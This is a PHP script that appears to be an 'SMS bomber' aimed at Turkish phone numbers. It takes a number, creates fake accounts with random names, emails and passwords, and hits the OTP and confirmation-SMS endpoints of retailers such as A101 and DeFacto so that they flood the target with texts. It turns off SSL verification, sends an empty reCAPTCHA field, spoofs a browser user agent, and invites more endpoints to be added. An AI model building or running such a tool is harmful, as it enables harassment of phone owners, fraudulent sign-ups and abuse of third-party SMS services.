<?php
// Disable error display for production
ini_set("display_errors", 0);
error_reporting(E_ALL);

// Configuration
const MAX_REQUESTS = 10; // Maximum requests to prevent abuse
const RATE_LIMIT_SECONDS = 60; // Time window for rate limiting
const BLOCKED_NUMBERS = ['5526359477']; // Blocked numbers

/**
* Generates a random string for email and password creation
* @param int $length Length of the random string
* @Return string Random string
*/
function generateRandomString($length = 15) {
$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
$randomString = '';
for ($i = 0; $i < $length; $i++) {
$randomString .= $characters[random_int(0, strlen($characters) - 1)];
}
return $randomString;
}

/**
* Validates phone number format (Turkish numbers)
* @param string $number Phone number
* @Return bool True if valid, false otherwise
*/
function validatePhoneNumber($number) {
return preg_match('/^5[0-9]{9}$/', $number);
}

/**
* Sends HTTP request using cURL
* @param string $url Target URL
* @param string $postFields POST data
* @param bool $isPost Whether to use POST method
* @Return bool Success status
*/
function sendRequest($url, $postFields = null, $isPost = true) {
$ch = curl_init();
$options = [
CURLOPT_URL => $url,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_SSL_VERIFYHOST => 0,
CURLOPT_SSL_VERIFYPEER => 0,
CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124',
CURLOPT_FOLLOWLOCATION => false,
CURLOPT_HEADER => false,
CURLOPT_NOBODY => false
];

if ($isPost) {
$options[CURLOPT_POST] = true;
$options[CURLOPT_POSTFIELDS] = $postFields;
$options[CURLOPT_CUSTOMREQUEST] = 'POST';
} else {
$options[CURLOPT_CUSTOMREQUEST] = 'GET';
}

curl_setopt_array($ch, $options);
$result = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

return $httpCode >= 200 && $httpCode < 300;
}

// Rate limiting storage (in-memory, could use Redis or database)
$requestCounts = [];

/**
* Checks if rate limit is exceeded
* @param string $ip Client IP
* @Return bool True if rate limit exceeded
*/
function isRateLimited($ip) {
global $requestCounts;
$currentTime = time();

if (!isset($requestCounts[$ip])) {
$requestCounts[$ip] = ['count' => 0, 'timestamp' => $currentTime];
}

if ($currentTime - $requestCounts[$ip]['timestamp'] > RATE_LIMIT_SECONDS) {
$requestCounts[$ip] = ['count' => 0, 'timestamp' => $currentTime];
}

if ($requestCounts[$ip]['count'] >= MAX_REQUESTS) {
return true;
}

$requestCounts[$ip]['count']++;
return false;
}

// API endpoints for SMS requests
$endpoints = [
[
'url' => 'https://www.a101.com.tr/users/otp-login/',
'method' => 'POST',
'params' => function($data) {
return http_build_query([
'first_name' => $data['name'],
'last_name' => $data['name'],
'email' => $data['email'],
'phone' => '0' . $data['phone'],
'password' => $data['password'],
'email_allowed' => 'true',
'sms_allowed' => 'true',
'confirm' => 'true',
'kvkk' => 'true',
'next' => '/',
'g-recaptcha-response' => '' // Note: reCAPTCHA should be implemented properly
]);
}
],
[
'url' => 'https://www.defacto.com.tr/Login/SendGiftClubCustomerConfirmationSms',
'method' => 'POST',
'params' => function($data) {
return http_build_query([
'mobilePhone' => '0' . $data['phone'],
'page' => 'Login'
]);
}
],
// Add more endpoints here following the same structure
];

// Main logic
header('Content-Type: application/json');

try {
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
throw new Exception('Method not allowed', 405);
}

$ip = $_SERVER['REMOTE_ADDR'];
if (isRateLimited($ip)) {
throw new Exception('Rate limit exceeded', 429);
}

$numara = filter_input(INPUT_POST, 'numara', FILTER_SANITIZE_STRING);

if (!$numara || !validatePhoneNumber($numara)) {
throw new Exception('Invalid phone number', 400);
}

if (in_array($numara, BLOCKED_NUMBERS)) {
throw new Exception('Bu numara yasaklı!', 403);
}

$randomName = generateRandomString();
$randomPassword = '!1Ad' . generateRandomString();
$randomEmail = $randomName . '@gmail.com';

$requestData = [
'name' => $randomName,
'email' => $randomEmail,
'phone' => $numara,
'password' => $randomPassword
];

$successCount = 0;
foreach ($endpoints as $endpoint) {
$params = call_user_func($endpoint['params'], $requestData);
if (sendRequest($endpoint['url'], $params, $endpoint['method'] === 'POST')) {
$successCount++;
}
// Add small delay to prevent overwhelming servers
usleep(500000); // 0.5 seconds
}

echo json_encode([
'status' => 'success',
'message' => "$successCount servis(ler)e istek gönderildi",
'requests_sent' => $successCount
]);

} catch (Exception $e) {
http_response_code($e->getCode() ?: 500);
echo json_encode([
'status' => 'error',
'message' => $e->getMessage()
]);
}
?>


